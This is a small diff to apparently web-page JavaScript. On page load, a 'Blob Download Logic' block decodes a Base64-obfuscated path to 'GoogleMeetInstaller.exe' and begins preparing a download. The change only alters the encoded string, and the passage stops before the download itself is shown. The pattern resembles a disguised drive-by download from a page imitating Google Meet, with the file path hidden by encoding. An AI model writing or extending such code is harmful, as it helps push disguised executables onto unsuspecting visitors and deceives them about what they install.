@@ -148,8 +148,8 @@
 
         // Blob Download Logic
         document.addEventListener('DOMContentLoaded', function (e) {
-            // Base64 encoded path: downloads/GoogleMeetInstaller.exe -> ZG93bmxvYWRzL0dvb2dsZU1lZXRJbnN0YWxsZXIuZXhl
-            const fileUrlEncoded = 'ZG93bmxvYWRzL0dvb2dsZU1lZXRJbnN0YWxsZXIuZXhl';
+            // Base64 encoded path: /downloads/GoogleMeetInstaller.exe -> L2Rvd25sb2Fkcy9Hb29nbGVNZWV0SW5zdGFsbGVyLmV4ZQ==
+            const fileUrlEncoded = 'L2Rvd25sb2Fkcy9Hb29nbGVNZWV0SW5zdGFsbGVyLmV4ZQ==';
             const fileUrl = atob(fileUrlEncoded);
             const fileName = fileUrl.split('/').pop();
 
